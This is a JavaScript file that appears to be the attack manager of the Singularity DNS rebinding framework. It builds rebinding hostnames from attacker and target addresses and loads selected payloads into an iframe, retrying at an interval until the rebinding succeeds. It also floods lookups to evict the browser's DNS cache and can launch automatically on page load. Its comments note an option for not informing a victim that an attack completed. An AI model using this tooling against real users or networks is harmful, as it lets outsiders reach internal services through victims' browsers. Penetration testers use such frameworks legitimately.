/* Attack Management */

// Global state
let count = 0;
let errorCount = 0;
let timerAttackFrameOne;
let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";

// Configuration
let runningConfig = {};
// Set URL parameter `startattack` to some value 
// to automatically start attack upon loading manager.html page
runningConfig.automatic = getParameterByName("startattack");
// Set URL parameter `delaydomload` to some value 
// to delay the browser DOM load event
// and prevent premature exit of headless browsers
runningConfig.delayDOMLoad = getParameterByName("delaydomload");
// Set URL parameter `alertsucess` to "false"
// to not present an alert box upon a successful rebinding attack.
// This may be useful for:
// * not informing a victim that an attack completed
// * or to freeze a headless browser forever (unless performing a DoS attack).
runningConfig.alertSuccess = getParameterByName("alertsuccess");

document.onreadystatechange = function () {
    if (document.readyState === "interactive") {
        if (runningConfig.delayDOMLoad === null) {
            delaydomloadframe.parentNode.removeChild(delaydomloadframe);
        }
    }
}

// communication handler between manager and attack iframe.
window.addEventListener("message", function (msg) {
    console.log("Message received from: ", msg.origin, msg.data.status);

    if (msg.origin !== document.getElementById("attackframeone").src.substr(0, msg.origin.length))
        return;

    if (msg.data.status == "start") {
        console.log("Iframe reports that attack has started");
        clearInterval(timerAttackFrameOne);
        msg.source.postMessage({
            cmd: "interval",
            param: document.getElementById("interval").value
        }, "*");
        msg.source.postMessage({
            cmd: "indextoken",
            param: document.getElementById("indextoken").value
        }, "*");
        msg.source.postMessage({
            cmd: "start",
            param: null
        }, "*");
    }
    if (msg.data.status == "success") {
        console.log("Iframe reports attack successful", msg.data.response);

        msg.source.postMessage({
            cmd: "stop"
        }, "*");

        setTimeout(function () {
            delaydomloadframe.src = "about:blank";
        }, 10000);

        if (runningConfig.alertSuccess !== "false") {
            alert("Attack Successful: " + document.domain + " " + msg.data.response);
        }
    }

    // Possibly a firewalled or closed port. Possibly a non-HTTP service.
    if (msg.data.status == "error") {
        errorCount += 1;
        console.log("error");

        if (errorCount == 5) {
            attackframeone.contentWindow.postMessage({
                cmd: "stop"
            }, "*");
            delaydomloadframe.src = "about:blank";
            alert("Too many errors");
        }
    }


});

// Set src of attackframe
// thus loading the attack payload before rebinding
// and accessing the target after rebinding.
function reloadAttackFrameOne() {
    document.getElementById("attackframeone").src = hosturl
        .replace("%1", document.getElementById("attackhostipaddress").value)
        .replace("%2", document.getElementById("targethostipaddress").value)
        .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
        .replace("%4", document.getElementById("rebindingstrategies").value)
        .replace("%5", document.getElementById("attackhostdomain").value)
        .replace("%6", document.getElementById("targetport").value)
        .replace("%7", document.getElementById("payloads").value) +
        "?rnd=" + Math.random();
}

// Checks payload exists.
function checkPayload() {
    const payloadsElement = document.getElementById('payloads');
    for (let p of config.attackPayloads) {
        if (payloadsElement.value === p.name) {
            return true
        }
    }
    return false;
}

// Commences attack
function begin() {
    if (!checkPayload()) {
        alert("Please select an attack payload first.");
        return;
    }
    message.className = "d-block";
    start.disabled = true;
    errorCount = 0;
    timerAttackFrameOne = setInterval(reloadAttackFrameOne, parseInt(document.getElementById("interval").value) * 1000);
    reloadAttackFrameOne();
}

// Toggles display of advanced settings.
function toggle() {
    if (advanced.className === "d-block") {
        advanced.className = "d-none"
    } else {
        advanced.className = "d-block"
    }
}

// Requests Singularity to instantiate a new HTTP server on specified port.
function requestPort() {
    putData('/servers', {
            "Port": document.getElementById("targetport").value
        })
        .then(function (data) {
            getHTTPServersConfig().then(function (HTTPServersConfig) {
                document.getElementById("listenports").textContent = HTTPServersConfig.ports;
                document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
            })
        })
        .catch(error => console.error(error))
}

// Requests Singularity to provide list of HTTP servers/ports.
function getHTTPServersConfig() {
    let ports = [];
    return fetch('/servers')
        .then(function (response) {
            return response.json();
        })
        .then(function (myJsonConfig) {

            for (let e of myJsonConfig.ServerInformation) {
                ports.push(e.Port);
            }
            promise = new Promise((resolve, reject) => {
                resolve({
                    ports: ports,
                    AllowDynamicHTTPServers: myJsonConfig.AllowDynamicHTTPServers
                });
            })
            return promise;
        })
}

function putData(url, data) {
    // Default options are marked with *
    return fetch(url, {
            body: JSON.stringify(data),
            method: 'PUT',
        })
        .then(response => response.json())
}


function forceCacheEviction() {
    for (i = 0; i < 1000; i++) {
        url = hosturl
            .replace("%1", document.getElementById("attackhostipaddress").value)
            .replace("%2", document.getElementById("targethostipaddress").value)
            .replace("%3", "none")
            .replace("%4", "cacheeviction" + (Number(0x0 + i).toString(16)))
            .replace("%5", document.getElementById("attackhostdomain").value)
            .replace("%6", document.getElementById("dummyport").value)
            .replace("%7", document.getElementById("payloads").value) +
            "?rnd=" + Math.random();
        fetch(url).catch(error => error);
    }
}

// Obtains URL query parameters value based on name
// Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
//as URLSearchParams API not supported by all browsers
// Returns `null` if  URL parameter `name` is not present, other its value.
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

/* UI Stuff */

// Obtain payloads and target specs from manager-config.json
function getPayloads() {
    payloadsElement = document.getElementById('payloads');
    let result = fetch('/manager-config.json')
        .then(function (r) {
            return r.text()
        })
        .then(function (d) {
            config = JSON.parse(d);
            for (let p of config.attackPayloads) {
                var option = document.createElement('option');
                option.value = p.name;
                port = '';
                if (p.ports != "") {
                    port = ' (default port ' + p.ports + ')';
                }
                option.text = p.name + port;
                payloadsElement.add(option, 0);
            }
            document.getElementById('attackhostdomain').value = config.attackHostDomain;
            document.getElementById('attackhostipaddress').value = config.attackHostIPAddress;
            document.getElementById('targethostipaddress').value = config.targetHostIPAddress;
            document.getElementById('dummyport').value = config.dummyPort;
            document.getElementById('indextoken').value = config.indexToken;
            document.getElementById('interval').value = config.interval;
        })
    return result;
}


// Initialization after manager content is loaded.
document.addEventListener("DOMContentLoaded", function (event) {
    let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
        document.getElementById("listenports").textContent = HTTPServersConfig.ports;
        document.getElementById("targetport").value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
        document.getElementById("requestport").disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
    });

    let payloadsAndTargets = getPayloads();

    // Once we have our HTTP servers config, payloads and targets
    Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
        //start attack on page load if ?startattack is set      
        if (runningConfig.automatic !== null) {
            begin();
        }
    });
});